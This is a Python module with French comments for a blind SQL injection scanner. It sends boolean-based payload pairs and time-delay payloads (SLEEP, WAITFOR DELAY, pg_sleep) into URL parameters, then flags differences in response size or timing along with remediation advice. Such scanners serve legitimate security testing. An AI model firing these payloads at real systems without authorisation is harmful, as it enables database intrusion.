"""SQLi aveugle — boolean-based et time-based."""

from __future__ import annotations

import time

import requests

from .utils import Finding, build_url_with_params, extract_params_from_url, normalize_url, safe_request

TIME_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "1' AND SLEEP(5)#",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
]


class BlindSQLiScanner:
    """Détection SQLi aveugle."""

    def __init__(self, target: str, session: requests.Session):
        self.target = normalize_url(target)
        self.session = session
        self.findings: list[Finding] = []

    def run_full_scan(self, urls: list[str] | None = None) -> list[Finding]:
        for url in (urls or [self.target])[:8]:
            self._test_boolean(url)
            self._test_time_based(url)
        return self.findings

    def _test_boolean(self, url: str) -> None:
        params = extract_params_from_url(url)
        if not params:
            params = {"id": "1", "q": "test"}
        base = url.split("?")[0]

        for param in list(params.keys())[:4]:
            for true_payload, false_payload in BOOLEAN_PAIRS:
                r_true = safe_request(self.session, "GET", build_url_with_params(base, {**params, param: true_payload}))
                r_false = safe_request(self.session, "GET", build_url_with_params(base, {**params, param: false_payload}))
                if not r_true or not r_false:
                    continue
                diff = abs(len(r_true.content) - len(r_false.content))
                if diff > 100 and r_true.status_code == r_false.status_code:
                    self.findings.append(
                        Finding(
                            title=f"SQLi boolean-based — param '{param}'",
                            severity="critical",
                            category="Blind SQL Injection",
                            url=build_url_with_params(base, {**params, param: true_payload}),
                            description="Réponses différentes entre conditions vraie/fausse",
                            evidence=f"True: {len(r_true.content)}b, False: {len(r_false.content)}b, diff: {diff}",
                            remediation="Requêtes préparées obligatoires",
                        )
                    )
                    return

    def _test_time_based(self, url: str) -> None:
        params = extract_params_from_url(url)
        if not params:
            params = {"id": "1"}
        base = url.split("?")[0]

        baseline_start = time.time()
        safe_request(self.session, "GET", url)
        baseline = time.time() - baseline_start

        for param in list(params.keys())[:3]:
            for payload in TIME_PAYLOADS:
                start = time.time()
                try:
                    safe_request(
                        self.session, "GET",
                        build_url_with_params(base, {**params, param: payload}),
                        timeout=12,
                    )
                except requests.RequestException:
                    pass
                elapsed = time.time() - start
                if elapsed > baseline + 4:
                    self.findings.append(
                        Finding(
                            title=f"SQLi time-based — param '{param}'",
                            severity="critical",
                            category="Blind SQL Injection",
                            url=build_url_with_params(base, {**params, param: payload}),
                            description=f"Délai de {elapsed:.1f}s détecté (baseline: {baseline:.1f}s)",
                            evidence=f"Payload: {payload}",
                            remediation="Requêtes préparées + timeout côté DB",
                        )
                    )
                    return
